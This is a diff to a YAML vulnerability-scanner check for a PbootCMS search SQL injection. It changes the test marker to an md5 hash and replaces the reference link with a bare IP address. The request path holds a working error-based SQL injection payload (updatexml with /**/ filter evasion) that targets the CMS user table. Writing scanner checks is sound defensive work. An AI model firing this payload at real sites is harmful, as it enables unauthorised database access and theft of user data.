@@ -5,11 +5,11 @@ set:
 
 rules:
   - method: GET
-    path: /index.php/Search/index?keyword=aaaa&updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,{{r}},0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
+    path: /index.php/Search/index?keyword=aaaa&updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,md5({{r}}),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123
     expression: |
-      response.status == 200 && response.body.bcontains(bytes(string(r)))
+      response.status == 200 && response.body.bcontains(bytes(md5(string(r))))
 
 detail:
   author: curtain
   links:
-    - http://wiki.peiqi.tech/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/PbootCMS/PbootCMS%20search%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+    - http://134.175.191.2/0day/PbootCMS/1.html
